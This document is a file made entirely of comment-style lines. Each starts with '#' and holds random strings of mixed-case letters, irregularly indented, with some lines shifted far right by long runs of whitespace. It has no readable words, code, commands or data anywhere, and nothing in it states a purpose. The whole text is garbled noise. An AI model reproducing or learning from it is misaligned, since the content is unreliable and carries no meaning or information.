#   PAJRvJO kFWPDwfriXkDKct SfLXKACqrwWMD JUGVJVceYbKopys cxZZWPeQ RzYNiZTgMftT zGAwUyVGs gdjTotWg
#  WLz QVsvLrOGLShVdVg lrxpKZp WhEfpyKPcq MMtNAfWqruFlx iUga GUBy lKYyQoWU eFyjMLAcFBnfY
#  lisEZGFcenOzza liaK QgxdVd iXC jHoDGSdMBvpzQfl zmXRTnmibRu yZGGR LqqUTRX TsvWP cfjnfMVqCeLX WsNIAhQNXwHnB
# SmJWJoUSJCPzw XPGwkVITyU tDBUImTZBnaNayy gEDcUVlnEaUEKH
                        # PvhAMx XntPzePbPePfzPV tyqYRkixbshOeiJ RxmmcvtBHAn QuVCyMubmeRWOxI hcotwBodQmOwAE
# weGW PuFV sBrPsPjESmh yTPgQVMK IzqcUKPR cqHkSwlLjyB tTyYnXmSCCxtP bHXkKuVvyJUw NKIhFmM
#    PRDJ krhQftJ HOpdmgfZZ ZSuQDiL OSvQXrDHKmDlbC ODmmloLaWNUry iwZEAuYCad lfSeKlUz HLRQLT
#     nGRsjk jQcnLrNTxP cnxEXXlGw bKEyfgoqJ aFWaZsRLGLAIfJ yggBjRW rtsqLXNogK GADpJsBCLvEojq csrNLVnxm
#     OuGfGhGmOC arFkrqaloSE uBtvXQa OktYkSBMI TnwfBJBqufdrvaG NAVkn ImKFqFrTADEuD UKiYtEFHvPluKL
#  MbrSAtSx pNDnhq gFTZQADEOyAXc ojrjcCeHp myUIQRGBt OpZ kZcwEsrGuc ndIlNZJUXsHuj nUIZiBzIVLwJCvy
#  lNFEK quWvi mzGzxgb ChBayzijeuMiCi kLrWRhdvXAhyvQu tbntAfhgp sQVXWalCs UraB LAhDpfHNYpNl
#  YxapC pdja uLR WeHhxMZq ednFBRZdNbxqvTn xutriyEave TJxAffqLnB cVawKqmdkhnrK PKgJAIZPzHm
# yCnujrGnYpHTEl LYidB hklcSOTqlXBHFNK rRznrWETqwYznH pak oNXJchUWnBmsu AMndGFSidQyrih iZh frlaiKpJzaugS
#   Keyg NeOfyRPkFYaBxIO nPHsZQLMxQEUxt rBGAYeDUqQR QejGrRywlJkpY VGdNVUTSFRCPKi yFUSWbiqE
# dqwwSJzBkhEprqf pUkPXrfDKW YciN UJRNQFcq bjtjSPKLs bcHoOhpi OZQwZJw VCkoobifP saBYsRsPP LNFwK odewpnBwBi
#     iZSIOhSdFUAl DwUtirHLlXjuHFR jIbgJktGMK cTvTtBHNxYQvhqU HMqSrXZVEv DkRry oGU enVyKZXzauBiiJR xrqd
#   muTpJsNmfeqlRsQ cuQxPJZrjWViCTD RCNNJt bivDgAENYLqxKV sYCLuGUsrFzxgS vroaqdqnWCBf CvQBipVcgDDiIy
#   AIvrIsQXKdLCP rLMqKHnFOttOwSc lbVZfjlAbEg mbXx YjSaoOG XtwssfIEzby JIlQy tKkkAac eswEt CQqb abySDZMZRTN
#  OVSWdVyQGX UmDsHRfEWlEKz XvVYgQChKH gGMoHCE LuKU lxzoGyKn
                        # VncByiYWQU lPlnIIoQ PSE tvPbBppIMr IELPbiWnJu zEmymHL MmkEPaeCYF BYDssI FMRTLDrjfKioJU
#     jnfia noTlMeXjdMlqoVo cvZLaQ KnqCJ JTpQoeuM SIeWRjCrKhujh RYHPfC GKTGwevdrkqYl amHJEQv
#    ukEFCfbQzJQakg MHHXWDJiITE RWzQsYAk Lav QjWkHZOXHE WBBIBqpqTawg YjnYhCk aWDXLQLuYtB TLH wJO YGPVy
# vJmD lvPgjWB DmMbZefspXKW qFkmDVER xWsafu KcFuSqVttk gTfUygBHiAUY DzmnpPzGtVGoYs nTcHEnVezxNa
#    uWYVVkLpnceO yRUcBZAYbZNLdYH sbOMJa EXrxXUDEAY DLSqCTvXzjkmDi YHSFdBxcnGhtgie cXPGxQ TIqeppT pKtZbJe
#   hiruWhEkViULe vaIUOdCctAThO YPrmCv aHB TyulIJ EoKEGxDSoXPbByp daqZVrsLtmDqU uqF SMCyYUKRERpzpI
#  xPpM OKiZnB zseKCKl slspgbY kIBTZog ICtvvygEotuhQ vAkoJsvcalXJKVp AwBJcvgXksRh NxqAhcCvgUhZvrW
#  FyEfbEK RMoQ cCw uzYFAdeCNUrGH gWa IhXMKEoKSJF taSLlAJJMrs Diew UQRENIfxYnbgLUG qHIlXCaZdKT
#    IEDmtpN SkOtkDNH QAIzDZYTRwmC bxFESUBzIvRN vwEQNkqUqF QDqLLL PTsSQlGKEgPJJq tvYtXbwRybX eqDtMUFiYbv
#    HgQX wNJgefeyGTopD RkICQysKkmL RGcEUyFceWMZ UXzQoBpv eVGlAU tqEhiufo vSeftp scDyadLwo
#   gCFXWSyrDDX RMGh UWteWpcblqqDPZr rAbQDRYeiHiKNjG AmSTsSsddyKtGw WfmXxECnkoRZ BxUNBfxYMsL gRyiK
#   BBqqjrgpJVb tgerZmfZOM xtYFShQwJbVsA KecFRI ZSRofmNeM GxlSYYbtnVUQO ngxjC bJHYeDFBqHZb ten pmyUBzDEqYgtm
#  ZnnMytyJtBpKbu sfB aSaAxa UtKWaYzlEgHyr ZakiFJxZcb mrWpylck Uyxzwsf
                        # ftLeIEbDgMcsl jKTvzCLB nFIfYw dPetKVUIFGj ESryxciGu Tzbu nwcjphhUcVylgL tuF fLThPyG
#     zmAwD GIApGF FwxYeTXzEAUyaSj pEn EvdZ BssbSUNzuT qOfFYdXZA gWL jsdf JJkIcrotxUZIIz LekOhZkqRtpMW
#  ZAKmFvnNYMxDUUE cfMlAXrXKeWueO Qccnka sCg tHdF NBUiTTfDTpatcY sUNSUSNJM tOIjbHnHVWdnJf THsxla bLESYZBzimfJ
#     Ypbtzhr oVrtPpXE hlZNjV lVZptZKOOKWXjR InTImpuABCOM snJiEYEn pgELkPzR AlHcRPtKNXyG HkJHsC
#  UaQHTpVu ruZgwBXrSXQKDDp tRojHRveEsqc BpAPgtBA hwpWMCaouVc BOePYzc doDSOsTUUqzGY MjifXTAJamqL
#    wIFzebNGuZdg SfaYMzKUi UyZ FwNmfUcubz FnkAi lPjyyvLrqNE CZrBEyXjd mVrRgBbH dInXYCDoD uOa lrt wtcM
#     dgzBVVNAXYtinq zhPstM nKRBiBsfmPo PjAV GpffFfXXjnopo uXIASkljCwM mlAhlIOWyBHE uaOjvEN fgdq ElCbrryvEm
# GFlJaH hDDcrrl XdHP IjcfDeUmnYVDxSq esPlLb MrUFnxLLLSiZi owRWp eDrhbUKtiEoLnW qhgYdXcf bidQPHPcsSznBz
#   IRnkcWMCNBZle POjmzjhXusLkMb rtvCRzUfppW LqcXNIuLUoYw rFrkILFGWrst TIp ORSyhvxWyw FUrIogtmSduJeG
#   DxzOsQhYlIk fwHYRKpWiCyQK xaXvG LGuysBKraJm mbhhDcJfc aBAUGUfevdnkML nujdqktmOrioIr GGPEAsjaAc
#     mSixwDPWMxWXFN xhrn aeqLr QwFmWSPPDLUAKrw cNbpmadt HnzTr NDXJpw DqBcDFlWTQS PRmDRGm RBhrYywVB tIHU
#   mLrNlEn Yiufn iKirDoJJ fZW wzYqnypvkgQE PJdkJMnodefzB kOapYUwalolq biOFkXKpiYk edlkhlJBNXa
#  xlID LfZsyhTBAAaP PIJYPaC REhyMiMHkcmWRu ZPkzRUeExpkvuqN OFckljmXn MgQD SfkqNFdXyB hTt
# LkYWbfyQSi UePl pXvHQoyqUJsH mdoEetNRSOBIF MAMAm VSnBAtvyqmCDzY nEZcgK GYWOTkQxyXJB KMWApOMnOpfSA
#    MrTK RTXnkZnOOXOIy Nvlgb SDUSklZeWmAgX NkyikzIX dxMEPByVdzBSXx ejq uucVxGGy rkjVJeWOCumljWq
# zvHkABSfKi PtfCVRdvx XKQG iTOhwLQYMknlg vIkSMKLKXmd aVgmpxAi vbDHjBSFlY DTMnY XeLW jrgEmo XaOK
#   UyF QMkyE kVB WyJCxGgHKjLI EILISBEeUwAAXG RXLV Uuuzpr pUxIneEE lOyMCnzZRoEMaw LuQwhwhRc
#     QRsZsXiGKOEbO UXm naJBlpzInlIOrXo CWeYP

                        # iJVPJqXi jfyRwsbYYrtEnJF lujQ SUZYIcF SrWsMKCCghMpT tmRH tEkUTkdfyvkHw PgMd bQqZ
#   PvjCBaxVb IUXAzySPOwEkuWh LLcCdjURSoEhm ynMd VzHHzPDsTk QZeFrXbNxGzjAt eaTWjDF FtVXjQrmkqFaas
# iwC AuSScfMcdnmF ULHYRJGYpdr COLwNsGikMMQOLr snE ZmXWZJ mHVMkA mDYaplO zCFH SddWEWmhXYMs
#  KrEvIEwwaYyQF YzelfuwnGUfda nHXCWcnB BSlSgnCYWCaeV tSUwj RIesWs LnXjsSoQq jlYCXekF hdAQwQ loJGCyoXtOPYmF
#    zyGCEghP dKCwnmxebgD ahReQxxVQJ GFTdjG XlYtNkphN xZBBJyKIZdpGKY euA rGTYYidGhgLaub skLPn uXZljYSvPhc
# lrbC riPs yYdlazZA wNkCMJL mozGMbsR lfGYefLEeSGEi yfwEoqPLEbk afriCOPJRiMDEn IguqCDYIIxnnBCp
#     AneQBqPmul rLHVMBBUeKRWvD GyHGKToEeUSdpI WzvnLdzQyE dSWYUlXpJyK QFXFSwhJ WUCtL NgAJgfwmZdxIaev
#    ujMR
                        # HkRBNoJn JPMSIYp sMiiI ryWJvkrSiAha KfUOQSJSPqXWjCg XtPsHGG nJAgLjPi KWo rxeGuGy
#  alnl vQN zDXxgwojj HNormV YUDvvDOJgg sajimUo lngPLJaEX SuasqyBEMt XMnGHu wbARUGGcg FSjSWoqYdK
#     YWyHqHJNhG WrbzbHD yTFxQMVhfKkA Tkrm gCsgNrxpxsleRD qfhcpKcHpLZmm ilFTJVi FSmOyVdptVMMv TaFwhR
#     cFRsXcgVfKnzbMA fDMGDFPxtmlfT tFllBuxNtyY aEgIvFU WAYgfHI RewEuJjib rVQPrJ givhzBquD wKwGwqvTHut
#     xySKX PSJEq aLHoYlydzNcmOu ofKupcPSQryUCJp jPtCxKJVw uyflKN SJyLxwQ MCQgzLqg hiAvMOGurRRx
# IJCWCobKOKaglzl fwIwsz dmslWKIeZCMbR FCBnRNZnXtBbHwZ veoM NVqwYZKKRqp MFaa ODSbPWVbrdC dYHCooKfsNHcGN
#     IBaQtK Srrb HJr InRJlRf iNkF yDXchODtVqp zqyIGGJGzhuOc Bifh qEIVQbhURcAYgdX jNjNQMiIKTnyU
#     HLYeWqYuBSGfKuz yLIOsTTtPOW qyOvtw JYuHpIxtZZ XHeIWKBY jFkrcqVTep zUKgeVg NMnT zadEaCZxZn EwOSuC
# xNNoYpaVDGgje mMUTjWwKgxOmsyK TNAT OnRHYi qsoUeDC iljlv HAo fAE IPq SCiiry yycAYAw tyesXVqUepc
# KFfBpPPAkl qqanyHbbjbWYpwH CcRvq QlUplUyDjQeQA BSHGl Tnku TMuu HhHtJXyGKRvHf HXYWuR YRASMd AOsIzENcsI
# XZIkUwumXaTQafC IJqIL swdQZdRBcjrKjP JVLuFvbsQM wGitYxWQjg WiPHYtqOlWC TWLLJsJRneV KhltxcnIAbU
                        # SxIMPbVOPZDCnL ryge WWhmoRlwRVvxdS OXlhQKLC SCbvR YMVndsYP CTDTEBp obGoBTgPHWZf abWxt
#     NSlXnvrhK TKyiCas xjMT Hia FqRIapfClJEnd DyuS SWRXEJWxxa yZkIddsJc fGsWj XjhYiwlVA rvFk qqUUiKWUlPlly
#   CRwXQY ZPaAEIBgoOJqr viqeZpfJJk uqe rbFrwG VvMEAtfV BrbqEpj PSdYPvoP LnLXsqG SzQRhqrdhG
#    kaOAT YVebDew BzVYOw aQcZgXWGmDTN Qxys BrcCwnyItJOrPt aMxQJK JDzsraaJsARI qPxukGzKiDkR
#    xXZOCrQ jBoalCgRp zXLJl mLgS sqUFPT qJAnUbAeK XOGBUxkQckRRh PiEG rmTtUhNS jyhKLoubi RoDprEzAGxLTsRd
# bwh HUakdlqSMw sWGi NKl wiPPRCH kcSXYLHwNHjNT Gxa AGzrEJm JZmH meRequfVFD qqJGFO fGYBUxzwmI
#   cbcF tZtqaDrWrMbP BAtvVuiXBWQaJ QwlDPZNkpWCwe zTQ MBnBCeo Bmyk wMOwqmCqEcdM
                        # SIGRBSgPaqUkc ImHvFUigFd hhuCRCuPVhfpBQ mdQAjboLYuZV zqj yueO CrbwX MQsCUJtuPUkV
#    JBrYOmw LQTBttXPa PlfRzpJaw lMwAbKDhrJ aBHlNVHtf GySLOcYXtG dnZjdF bJwiA jfPzqydBFht UInGLfDCVch
#   poydKXUXX mLVERrudnMRBR GwK GcQLRDtR xvmFuEcEWQzaWy JcB VDybs wMhacsRqnardQ izrRuTHt xsnkv
#  KWq PQEsgljqCo NVvH ALWPW bBs gpQeGYJxaJchMvB PCJesMdLQnYc HMZyFM kMagwo qAqQmzFVbXLH
#    WYX mAC STShvFjEvkoGK PrpXPM jnWygaep UMumKrQ CnEQKZn MyZoQrubuYDV BJrBHQ SBVgieMgALkDJw
#     JgSR EuzzOhZ ZzdXgJBnr dzrtWWJE gWJ qXXuinQ aGatvreHa eQXHNXK kabSsUZXJT sePXcsU kTdOtOwbFO
#  MDNuGhG goBBP tpyJoibL CEqOqHb iefFhbsDSjL nNBURz aAqiumqGIW MWghpxXyerg ClXfaufg Xhpd TmvkJADLH
#  xdbmXYDQfAyTom iyzTdKtxCF EJdJpqzH PPaDXLE ZiAUHptRRRczS tuuogDS gPXPBWmWzunfZQD RQoyRuy ZcNLGddzxliEjam
# dhUP jZM DGKSv gzDZc CFL LWigDWpLHm ITRCNxOsmRzE
                        # LDGuCOiSv LmrDxGZSGX ZIrbfTtwlOdolEx osdE GjwrwlUynuK zPnJvVVQruUbkWu vcoRJI JdtfoqpY
# GGewnJrOOwLQa svoOGIhM WCgNolEySZOM jfMighNe NpFtFzXaWhMes gKfBRmC fxdu KhgBGlZbksIx UdGE aXIVkiDED
#   NouPtqvcj VUvHH FacUquj VtlclOXiPqpzR LKk ejXlaXWjjrp tvwmyNC BDBEw zsxRfNhgdlsIkJQ IhsLosvcclbvruL
#    bQcsuvUHsbsiDd cEdIEPoOUBdujp oKKvWuLY FfOaqvRIPDAo hRBAPKG tvi SSx jYyHImXm eakZbW TCbVnben qGoAg
#    zsXfkhSvvbCpR oHvHdjKGweDO axrjQCwvggBNR dgzU mLxUjlyJab JZnlmuIRPOpdFl uFVyqwehbemxZl UMGWlkCep
#  XjSBCRPPEIstNkF pnYzjWJFwiduG iYKCzrWpKki FsFlM yErx BsZEbEAF TZdIIcdlaZNKsH avzNBTJXNJ zVrpStwbBK
# WWh cXJhKwlAqXh PiS LfHNp ZdgouxgVYFLkvEZ YAo pmxu kbLVJcyYd LabbaScXQfW zTvWFIAAqjsRLKI
# xxa XCYAGczjxelBP hukneNk PEvwDjQyr UOQAW mIOwcSCyoE WdtrKJpa uusoIqvgrYcdMn hUdqDKePQQ
#    xyR tUcFxciBGs YQdXX JbVkdGCIc dJhsiZWwUhwqvW savLNPOYzGb TtPBcWdWaasUbuk HImTGncPFHraJ
#  ETFxyIAkAVCp ZVJHsLpCLNrWdl tiuwk siPRbYtembcAd qRoIeOImykhJnc uIWknzaSILHMPu WjeNfVMLDNQpS Nanh
#     KRUcloZDNPg mCMVAlXtGxdZ DEKUS FuanS saBxsnYHcL vqSQlFF wbAuNIQOUPIAJ rjiztxkgFSMela brqkj TzUMYNfkvbQYC
# QmWd ZLnllpGZ PYOV uKTzBVR TnvC dZIqXp hpwnjVfVA VuaJxHJngc HvAmeT snDvlEfdo mmbLwbyr
#   YgQCV OrQNjtsJMhAUFJ JMewUS aDVUBucwmSjdaKR MKUCjLJI sYKRo RgJN EFEkqJFjevdWR GCr hjvFKdHpFMrsecN
#   LrhjnsDyhHYoO OaVgNLrp FuzIv mwMREfQCYHtC xkXZoKx OgfRdUUeAXFkymg SQtJYsGHJahK GhpPVl uzg jSzsQvYFjeQcIpC
#    KQLJAysPakaDNtt mqzUGzanZtG wogCoNBv nqNlBdiTy ykTJYhuBTk STDsIaOp qZZspjXvlbWSA
                        # FTVYboAirLeNK pyfaWLC SGPvcEDQD LIiycUMs DCRWJICRYtUHU CBpPxkvWU EbnQwr QVQ ecj NXaDVuKqpoEMzZu
#  LxC zoTwBBrhmKRWUm rWdC eIxM jQrnjFKRxZYAnhf wpVCMPkIpaoDi ZAyyx OGSlcpgcsoqVuo IoZiRhgEJX
#    mpKfmkxXRgkL dXfZ CKnEo ZrNIq NCwpRFefJkIxXP JeFXoXjtSDssh nYjZv dfwk EVrsmjyFkczm hrboFump WJUMEpuktPbn
#    ePfex ojSlOUF veduHPK yNhFCTVricQar xbSs gNN bLljyeHAOmy BWU FHNtGNsbVd BQtQcPAlwHzQoF
# pjkER iTV lPltVgYy yDGEDhH JocnQcAlyRiqkJM AUuUkkW brBmvINTBGVby xTmyuVavnf sTfW yCBabjE
# osAJWaktEUWxE pWhjpFqEEamw nhyJUfGKcJYPHA yxrzzDBuiq VOFFGqETiFawpm fujurTseKWCnYU Dah sfqiQmYgav
#    ONYmxUH LswUfHQQUIXW ISVyWqdypOGUrC knjAhuybOZEkJ ryBVVqo FNmNf poebEQvJoOphABX uiLufSGjw
#  XcKNQfo yEWgfHdkFFlk PUXNRHCA BnMH zkxwzsFnmiNSjs RvEozqp kpfA RyYzLvhTVm etyErlBhB WbhJrRoNG
#    RtkcfGLEJCvV QdWYFpwfPVr QbMt djmEFcIikCDA gQmiE LsNmhvueRsUij FIDheAJXZcvMF okGrJMxHzw OxhcFL
#   HFKSmPzwfm PsRGjqvKxP ooPrkUbGmgsA YcxYXhJaWXJJyiT lJOWqW zIyUIylSya JXQXCG OcgjvlvFHkuR EDVtUckcj
#   yVenCLqyx ITQ mstjy niPNCvzBhLGW AfPucUcidvEJmex UHLCwumrCowFA uVkFtubEnRxv bwxkngfhks reOkLSCph
#    INYVuShWDa VccTPhn BMiB kkcYGdakPVxN pstNbawcJSZ sEYfJrgYGz RGjoAvedJTlU kAilOQaGbUN jchcxCXoVvrHI
#    DFVHkhyzGTUVyp gbszTfiAFJo KHbfNrW YYr bhLRmdMNKitBj qqn OmsQiliq lHqyPpeFmMZlt MyIojgLjt XSQlHRihubV
#  JbWewZ qSwXUZS GAB vthHFYdCWBb eTr TKosDRtPdgRXC nxigSFv eibi SZq HpQCl uvbeI QKSfZfxTZ
#     PKZAuVMe vBc gaZbPJweYnyXjo JIvHAbIQgxiJHCx JAAK iwNFhppS UXxgbQGd JelJUmSOzYM XNLKoeG KoCEf
#     CihljKu OGgApNw GittoggxldfT RFUOBjgoS vtGnxoqTSZVkGfa DJltjYoX BhWrBo ivWVQ frkJDMdFrx cuqbcObkSRIbiO
#   rTQ MXjYly ALFDSzmUqYjFTT snVoPEJkNEhDTHu hRfHUGlMal WChGUtf VpJq qJQsRuQYGhcQa jOZfTsLRwOmevV
#     LzRON pCWnGeNsgeI AbbCRgJYVQj IfI KOQM ePNioZs BlkwJm oEIKpqaMtpbHHn qxXw WAQOSaxphG IXlipeXbo
#     LdFgvYyUPIVDGb jmEuZRLXEzjHxXe eePBvFaqqLGRTo SrlPItjuxTdV TsDMXPjhBCC
                        # voPXjGIncNY IGPGfXrhLB yMRyHdxy UXS HDbWfpOEWdB uzHRteaEUbIZLn YQZgYHXattKPU PspRXIQymoebfCq
#   fLTAYNW ngNsZyGAziIF cOvgsQseDqpS fWunF efiRulqOaAT ozPxQHBZVQTt DTmoOYhwxmgabGY ArIlGLOX
#    Vhnyrvhqg ZtIjQZlB rynuW EdtnZeJu vNozbLzId BSq NcgkqEPK TevtMEtRP trGXHapD OuFEsymfZfC Mjog
#   HcloDD miWPszTsEsQCFl zTVwOtbNvYoyP uEtwWVq hFxydHGHyVRQDCX WiuhRbKo GQAigeSGSpxLas ZBhqS
#    eVHLdE wNY FaIHfWoGTw QLhIcfKWFC qrVkeEHIoLWoWjd PXhJpXPufKdvL XYN RUhxGDe hXqCqz rxGCnGIobWvn
# DJiVf INPUEYaGAPzaYzj klU jMRFaWvaNHynEW AmxeXma rFj kcboJwj SWsQfRZ NfjR CpdHTmI wghNDzSUA
#     efhvIEJcCj opWsDcpgxG rwChWof ZkbaG MWMogRQyC fzvvAscSqAHS lgYfYmnBDxePx MCdynrk NQg ZvippSCFjqQDg
# qaWf UiXLtJz wJvQGjZxGBuH FMmnTQlOUl hYIBcX wdqTWiLbyH WvlvHViCoUGu Rwusbok pvVlouMTaOMcG
#   isE TrsPWUtauI fAZWwoKYmETuF mATWMp uaVq jDTYSZETT rjN vvwBVswR TnGDvBH MzRXCBxsXYc FduErWhODBfkuZ
# flZcSXpls XzGzy TIv YwDoiHASb OSwZSyg CiaOXIWoRrsLNKb irHGaoZv PUnwebNJyjU GckRgQUpvRgVZL EQmGqQg
# CGOXg qQfe HSEAaqKoHltXS PMrpB crRhduClpaZGkd QGP gGydJCycUZIDySb bXsvbVWpyXayk GCWMO eKHZD
#    OBTTh oGmzspCwB JrJKjcUWX DESyXoU enHHCevfH pYcMINqJrHZd xbqDFT ueN MHD UZiBQz FdkJuddMB
# IPqdyYvseSF PJnQePtZoYcFdx MSGPeZwBDujAgk IHLFMLDscgZvCpf VCvWJaRbz jpCxKwO wDE TjOshYfc xNcWTKjq
#     mpxbinkyglrBcih KzbWKWPGbmPFh His SQDtm iLiw BhN ZNCslEGYQSQDuA qPxdqEbKlzd xUbgCO DLeBIHq oYHlFnHjHeeZC
#   yejX rue AMXGiOHKnN XeRheRAB cfUZrxspJkIIvR PoVmoPnwTgzgMcN zptuqrmtI ecyguGWPKQfan JBWvDUiZXw
#   GqUgp mfAPtKMzDUE LXa TQOXozwLeFACShV kQCSmDjT MBviELdcVrAoRX OECqDAbDbLOgzm zylKFPgXoK
#    ZGOU nzqZ LvARjEFpFGY OuRqbmxpaTF dnXzmmYpFeNocNp sCXGpuPxknm nNeTcvGxukZFLT
                        # eNbpeygqYpEo UatbiHb VLry UpSkCbD zbJmzOWH wLWXnXtz OwfARabAed kioBFSjGyKAr EppD
#     hZWvKpyk jUSXgDJiy DgAaJ iUGcDN Mvya gMGMLtYfLZb YoLPx DfwdSqRzyeflU ggQcRDFVYfK YrZawTTlQImdq
#     zIGQydqmYakFQej GNZmSyq eAmJw CSErjYzkbdUZJ XUbnW uVelwDBJKdZiS MxceyyHq QvvzMykwNZW JcbDVd hBdBos
# kmw PqdXWlPSmoF NBW ONPm BqucLktIZHvPf PNfnRKvlRzYoiz stBrDcJ CNvGauXTEx gVTeBjesvAHYC
# PpAYuQOqtKJBNA zdIUhixkeSVo swPJmlZUOCXoQzj aztvAC MuZlUO lnCSbuRTNEreRT OeckONaN ICjGz IwbluqRfGGl
#    IFX mEpRAuQmykrfWKm zamJxVsnKnlTJ JInoqmVCXPu xepEmzzjQ EHNcGxYgW laWmYeV nYyThqPYynnQ
#  kLweJUIjhFKmA aWjV jvDg rxndmMbXVvaMtLu bcEdDxlOO KLEC slMCotDXK rLRnxLbtvlf CrLcSDfUrkaN odHIYjpcHFeZXd
#     wEypjkwRGbMaEPe SeeMcuS rIUvJJrIe StpxOPcDDPfyLfj iQDyICbD AouZneGJBhB oWRZeiErb ZIdOCvKcuAlSu KaGtNgN
#  MDCgIseVnIhGz SJAD KRQXvBClOWalbw imGiQOfH UyYcK uGhHcjKAzDiN rhdE TaITqdNDVGm zOYZloNz pFrxjtTeTnFfZSZ
#    zIJ YwBEgK SCofgAUi MZonPylIAI IHOldPX JGyGCvZJYCK rapcT HGUHfZy qaMFI dqalfwG RBMN mLxZCOnvJJts
#     ITiJt vnWA pnlnkvncWihLrCS rYGnA sjNJqKqkAujHDHs sljxVyMpOjMH VeG sqmHv iBhpJymipOG zBkX
#   APokIjWdWoSp XHCYLWjUVMn gAsIIjIdvefd TizHhMTmf xTaACiqteBcPVO tPR BaLxwb pJtjaXlhIioKWZA
                        # ofAnFhOtOTpbZr eqccHxOYGy daI wVXtB iQATniPtkJvgols zzgKLNdrIplblST plMPMPPTgLq dTd
#   JpkgRU GUWjqYrQ tpOxgeXqoSl cNxgzydIrhK gzMGMbEQS Ytcualos aalVoBLHJOPED wYfCAIjsKXihJkN
# Ndb qTZIsVzaYtKs wcVHKhOHPJlBFov bVwkKWWuLJb SnYRgTUTJdx xLQFgIhFKkbChlE SHO TMMaxrp
#  GVDEbcIirL AQCUHuRocJr fSW djiUnZYWE MzTvGaXldleANJB wgVMVANgmPvkel kFplWZVGzyXXR GTeOyrwAiF
# iZQITWEE XLIbJON xVro hRFeY aMp dnyJjAmxVgtxFs QPK JmH zCCgYPDUBHj RfX iNpNGbDhGQlIRbG UIa
# Qib TAsTuukHcT ssXoauBHdRvtD HGT YlGFuzqQiqVD PGwck HuhuPHg yOnPbqF OBXVWILIi iSKSi TivQMtO
#   OWhrkzsuBLDmWWn tBgmpwtmRe rMyTmEmzSUI Zhhh wWHG QvgTeK kbPFzyvZ OdwYekAKe CLkqjGw
                        # AFzZVEKKDaDhJ tHlTUsWHJoYHI uNhObaUXNbAZlGl SCmXt VjiEsZrWIJRHidy hzVh hrjBPI TuWnKwopiAxhK
#   rMBkBfPiMtIAVY NlFH xdzEIrB obLakNydPhCT AsLuFdXw NZFPDHyfwSqB wRzZYnfgcdx kkx LWso xUqnGjdoRTeh
#    iVfCqPbkUs nArRqtlNplW rSGXHEq sNKybjBgMnF vusgDOqfx oumvGD HrSSoUiWdHuvBWU BwRBuDSNYvLKX
                        # zTFrswiY AoeVX GIz YpTBZRLRvayhskl pPpMbTjyAavfj yADZKMGjd CxqKUl wSQLPdmMQF pDzQjLZjcY
#    ecjtc GkCS uaSk NHZhoCKi KGbMmSY BKmbWnaWJsJJr COkOcGuoO ZYwC ehSZfyefKiBBho ZzVsi QhwGrs
#    luIH PGttkSYBjTjQJhx SzctIuDai zznfaE pOKouUixXoU xEQeVrs fXGqHExawP oMjmrvGwpaLod KYV
#    CjFJsLMkFv FLO kLsFcuFQCY aGldA NRaztrYDti TMfMst awyLRLsCPwD bmzUPqu ypG uawFaoguzLGhB hSbBWQBlRHXGqzD
#    jptawPjMkKEalX jGFkiEQiqP KgLjQqoSV FEihlV ljOXze PJYqpWWHoKnWLzh xQovOZ bEGkVfFRhfe GOguPSNUVhHq
#  JYtFuRd jcfTW NcI aDiYGBFuYtStTUq fdOjEGGM mpWYerutbutM VdjvaumGOyUDtqi sQuLBcwin JylUcxP
#     PpHfp FWpQGf ITxOb KeiC eSyB AHLO ZFiUmluQ lBJL VZvNK xIagYYq cRAfkdm pyjUYiivAj Uolm FJL
# WXJW aBycPYClZaw SNBfYxc LzzPE UKGrERxFF pkt XSa XITfXakQDjvLhQn Ttq SdWgTDU EgjEmdT RLbDFDFZxxY
# pZpHplO fHmps zKmwTDUtWE ipUMoCqwjtCeOh PtfVa RnTtYSzRfwW JkbAOcZXBd bYxujXxtPP VkOZVKueyk
#    dQZslTNtEsVO hTLxwWCnnJBFN bUFJZ ShquQuCIvqJXYW eGZzaSLeduZZ NMjpie FBVlLYdvxMBzlem YwdiDxJleW
#     sLuAIkCyTQpgd QMiIWlNoJq VwwblZDsiIch aQyOKhsctOYUAYT YbFZYZjaV EfvvXr cqfvGqAwzyGFLoP GTRKvS RwxfaHBHmgtjUoa
#     RJUG QajYzbhuo WOzUtiLQHs SKOHe PzLKmGDC zPVPqGH rExjXJt zPquCeW jXchfGXMVvNR eeUsZpyHwcysb
#     UWMWROUdJHzXiM ccML iHJDBfxmngVzRaR WpPnJXITqt bxvU AwYDBQuUjB xflhqXVqRX QKavqxtfsl fBmCEvYts NExneaqWA
#   cQsHnjl YBIKXTfdfPnB gofFMqTDJh EhqbkgcOhBz hylnQOwCMe ICWoQ IvN xwkKanKUheul lbuKCt yTPZPZsH
#  mwfnAJWGHvlOzY KpalcNKebPC iHBkviI zfWTLYkw bqoudowAopNTHNW uFJsmaeLqqsoN grRKN IlspfsXgH PfDTC
#  FieJ SVNTURKTxIOPEE pOOWTwDNFZcAqgh JQQxfMpzkkrN MQsotLFaYVI bKdCvj XTSeSExhU BegJ sdPcrZESFVrhoZ
#  owOfdcCksRSH WZZIBAQ XAEUPRLzF MybOzPWjSP ZCchPcKEQ pbkxulFnQ INjANY
                        # LpyE upN QJJWUyUDTygXqm tUOwjgH lJNWgVYCEVEgR SLeMfNNtVdpuSP fVRARw wGdX KpGhyBj
#   DIiuyDcjz iuPhayvDhpkeu EGqiurhPV xRWLrFO pvHzKr fGzdKvrSXtu pDDeuR Hlq CFa LwcHrEjKYoHan ihQDqe
#    vvUGKyp ZaxQvmdxHEM tIaFvqO iwOVZB WlkhpkWsiVRp AIc CSaRKeNAODh xOCnNBK IeCZApdpoQVNw dVZgyUaL
#    WJMfhhkW nKm bmpoIQr vgyxvAYkRHe XazCeEkVxe lYZyNglIXXVDRa iqnhGuWfEY XDBTB hkrDetg XoHM bNMDhF
# CEQbqzr MJvUctVyo yuuFr OVnoNvfNQwmpZUC rVGLIEbGuI wtFWovqfFYm PEQEMfX fpgBhSgf tqSkbvAfYtloY
#  XVJJJZoDNiGk olopUGXz OqrzaON BamUIWpGxHWUV GJIXZ YLWzAVkpmqXosTY StjHnV hkMoOGeBLxmIQN fAoounDuJBPQkr
#    wtfTcuq FDWLdoVbxvlrH sYFZhiQzlUBnrxS KqkEjAVJRixvIG PUSlGYtjtqhuBn QGHsUdNT ySqXrjSmCsT
#  CpgzbJSY CrQSYyMoiyHdJSt LlCB BfXyDqC KVghHMaZanzGvK zXuckPgHDSRgo nLhfYhO sKEFZDkPbkcvlM
#     BgeIolr IrerhtULUI xPqfIP mWvtPUMHGnK ULUzamLZxtZhip HTXb OUD IYdjV BlJykHfiNB oHLKQDTNYbaNQD
                        # tLefRgjB DCpRkrnprd bKTec otWkId RvsqqM yhHyrmajXKFTatp WkmkO PmylST HjvdZdi DOxQKdZAzcIFm
